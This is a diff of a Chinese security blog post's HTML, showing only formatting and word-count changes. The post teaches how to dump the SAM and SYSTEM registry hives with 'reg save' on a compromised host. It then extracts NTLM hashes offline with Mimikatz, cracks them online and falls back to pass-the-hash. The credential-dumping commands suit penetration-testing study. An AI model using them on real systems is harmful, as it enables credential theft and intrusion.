@@ -84,7 +84,7 @@
                 
                 <span>
                     <b class="iconfont icon-text2"></b> <i>文章字数</i>
-                    1.5k
+                    1.3k
                 </span>
                 
                 
@@ -125,8 +125,8 @@
     <div class='main'>
         <div class="content markdown animated fadeIn">
             <h1 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h1><p>已获取system权限，无法在目标机器上上传Mimikatz(有杀软或者限制啥的)，这个时候可以通过reg命令导出SAM和SYSTEM文件，离线读取出NTML HASH，其实也可以用procdump64和mimikatz抓取Windows用户密码，这个小技巧算是另外一种方式吧</p>
-<h1 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h1><p>首先导出两个文件<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\sam sam.hive</span><br><span class="line">reg save hklm\system system.hive</span><br></pre></td></tr></table></div></figure></p>
-<p><img src="/2020/02/02/使用Mimikatz读取SAM和SYSTEM文件中的NTLM-HASH/1.png" alt><br>然后将这两个hive文件放到和Mimikatz同一个目录下，你可将目标机器的这两个文件拖出来到自己机器上尝试<br><img src="/2020/02/02/使用Mimikatz读取SAM和SYSTEM文件中的NTLM-HASH/2.png" alt><br>运行mimikatz，输入命令<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::sam /sam:sam.hive /system:system.hive</span><br></pre></td></tr></table></div></figure></p>
+<h1 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h1><p>首先导出两个文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\sam sam.hive</span><br><span class="line">reg save hklm\system system.hive</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2020/02/02/使用Mimikatz读取SAM和SYSTEM文件中的NTLM-HASH/1.png" alt><br>然后将这两个hive文件放到和Mimikatz同一个目录下，你可将目标机器的这两个文件拖出来到自己机器上尝试<br><img src="/2020/02/02/使用Mimikatz读取SAM和SYSTEM文件中的NTLM-HASH/2.png" alt><br>运行mimikatz，输入命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::sam /sam:sam.hive /system:system.hive</span><br></pre></td></tr></table></figure></p>
 <p><img src="/2020/02/02/使用Mimikatz读取SAM和SYSTEM文件中的NTLM-HASH/ntlm.png" alt><br>获取NTML后，我们对其进行解密，就随便找个稍微好用的解密网站就行，这里用cmd5进行解密<br><img src="/2020/02/02/使用Mimikatz读取SAM和SYSTEM文件中的NTLM-HASH/123456.png" alt></p>
 <p>解不出来，尝试hash传递吧！</p>
 
